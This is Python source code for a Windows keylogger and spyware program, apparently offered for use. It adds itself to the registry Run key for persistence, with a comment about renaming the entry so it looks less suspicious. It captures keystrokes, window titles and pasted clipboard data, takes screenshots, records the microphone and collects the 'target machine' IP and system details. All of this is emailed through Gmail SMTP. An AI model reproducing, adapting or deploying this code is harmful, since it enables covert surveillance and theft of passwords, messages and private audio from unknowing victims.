import os
import shutil
import time
from datetime import datetime
import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.multipart import MIMEMultipart
from threading import Semaphore, Timer, Event, Thread
from PIL import ImageGrab, Image
import win32gui
import win32clipboard
import winreg
import socket
import platform
from requests import get
import sounddevice as sd
from scipy.io.wavfile import write
from config import fromAddr, fromPswd


date = time.ctime(time.time())
SEND_REPORT_EVERY = 20 # 10 minutes is 600 
TAKE_SCREENSHOT_EVERY = SEND_REPORT_EVERY / 4
EMAIL_ADDRESS = fromAddr
EMAIL_PASSWORD = fromPswd


class Persistence: #This will add the program (when turned into an exe) to the registry for it to launch everytime the machine is turned on
    def __init__(self):
        self.check_reg()
    
    def add_reg(self):
        try:
            addr = os.path.abspath(__file__)
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Keylogger', 0, winreg.REG_SZ, addr) # Make sure to change this so that it doesn't look suspicious
            winreg.CloseKey(key)
        except:
            pass

    def check_reg(self):
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            index = 0
            while True:
                v = winreg.EnumValue(key, index)
                if 'Keylogger' not in v: # And this to waht you have changed above
                    index += 1
                    continue
                return True
        except:
            winreg.CloseKey(key)
            self.add_reg()


class Keylogger:
    def __init__(self, interval):
        # We start persistence here
        _ = Persistence()
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ''
        self.old_app = ''
        self.paste_data = ''
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)
        # set the event that will block the screenshotting process while sending e-mail (else oncreasingly longer mail each loop)
        self.is_sending = Event()
        # remove the files folder to start over each time script is run
        if os.path.exists('files'):
            shutil.rmtree('files')

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is pressed in this example)
        """
        new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

        if new_app == 'Cortana':
            new_app = 'Windows Start Menu'
        else:
            pass
        
        sensible_words = []
        
        if any(ext in new_app for ext in sensible_words): # Screenshot when current window name contains any of the sensible_words (choose which ones)
            self.s_screenshot('window')

        if new_app != self.old_app and new_app != '' and new_app != 'Task Switching':
            self.log += f'\n\n[{date}] ~ {new_app}\n'
            self.old_app = new_app
        else:
            pass

        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        

        if name == 'v' and self.log.endswith('[CTRL]'): # adds data in the clipboard to self.log when user pastes
            self.log += name # adds 'v' to end of log 
            name = '' # sets name back to  '' so 'v' doesn't print after paste data
            
            # This gets the content of the clipboard and sets it to self.paste_data
            win32clipboard.OpenClipboard()
            self.paste_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            # This adds it to self.log
            self.log += f'\n\n[CLIPBOARD] ~ {self.paste_data}\n\n'
            
            # this sets self.paste_Data back to ''
            self.paste_data = '' 

        # If target presses backspace remove last character in self.log except if its a special key 
        if name == '[BACKSPACE]' and self.log[-1] != ']' and self.log != '':
            self.log = self.log[:-1]
        elif self.log.endswith(name) and name in ['[CTRL]', '[RIGHT_SHIFT]']:
            name = ''
        else:
            self.log += name # Add character to self.log
    

    def sendmail(self, email, password, message):
        self.is_sending.set() # Sets Event to stop screenshotting process

        # Prepare email to be sent
        msg = MIMEMultipart()
        msg['Subject'] = f'{self.time.strftime("%D %T")} logs'

        text = MIMEText(message)
        msg.attach(text)

        # Attaches all images and audio in files and then removes them
        if os.path.exists('files'):
            for file in os.listdir('files'):
                filename = os.fsdecode(file)
                if filename.endswith('png'):
                    # optimize images for sending 
                    img_c = Image.open(f'files/{filename}')
                    img_c = img_c.resize((1920,1080), Image.LANCZOS)
                    img_c.save(f'files/{filename}', optimize=True, quality=85)

                    img_data = open(f'files/{filename}', 'rb').read()
                    img = MIMEImage(img_data, name=filename)
                    msg.attach(img)
                    os.remove(f'files/{filename}')

                elif filename.endswith('wav'):
                    audio_data = open(f'files/{filename}', 'rb').read()
                    audio = MIMEAudio(audio_data, _subtype='wav', name=filename)
                    msg.attach(audio)
                    os.remove(f'files/{filename}')
        # os.rmdir('files')

        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.ehlo()
        server.starttls()
        server.ehlo()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, msg.as_string())
        # terminates the session
        server.quit()

        self.is_sending.clear() # Restarts the screenshotting process


    def computer_info(self): # gets computer info 
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        
        try:
            public_ip = get("https://api.ipify.org").text
            publicIP = "Public IP Address: " + public_ip + '\n'

        except Exception:
            publicIP = 'Couldn\'t get Public IP Address (most likely max query)' + '\n'

        return f"{'#'*5} Target Machine Information {'#'*5} \n{publicIP}Processor: {platform.processor()} \nSystem: {platform.system()} {platform.version()} \nMachine: {platform.machine()} \nHostname: {hostname} \nPrivate IP Address: {IPAddr} \n{'#'*32} \n"


    def microphone(self): # records microphone 
        fs = 44100
        seconds = SEND_REPORT_EVERY - 1

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()

        write('files/audio.wav', fs, myrecording)


    def s_screenshot(self, action): # simple screenshot (no loop)
        self.time = datetime.now()
        # print(f'{self.time.strftime("%D %T")} logs')
        self.filename = f'{self.time.strftime("%H-%M-%S")}-{action}.png'
        self.filelocation = f'files/{self.filename}'

        self.screen = ImageGrab.grab()
        self.screen.save(self.filelocation)


    def screenshot(self): # looping screenshots
        if not os.path.exists('files'): # creates files folder if it doesn't exist already
            os.mkdir('files')
        else:
            time.sleep(TAKE_SCREENSHOT_EVERY)
        
        self.time = datetime.now()
        # print(f'{self.time.strftime("%D %T")} logs')
        self.filename = f'{self.time.strftime("%H-%M-%S")}.png'
        self.filelocation = f'files/{self.filename}'
        
        self.screen = ImageGrab.grab()
        self.screen.save(self.filelocation)
        
        while self.is_sending.is_set():
            time.sleep(1)
    
        self.screenshot()


    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # Add the computer info at the beginnig of the log string
            self.log = self.computer_info() + self.log 
            # if there is something in log, report it
            print('[*] Sending email')
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            print('[+] Email sent')
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""

        mic = Thread(target=self.microphone) # start microphone recording
        mic.start()

        Timer(interval=self.interval, function=self.report).start()


    def start(self):
        # start the keylogger
        keyboard.on_press(callback=self.callback) # keyboard.on_release(callback=self.callback)
        # start reporting the keylogs           
        self.report()
        self.screenshot()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()


if __name__ == "__main__": # Sart script
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
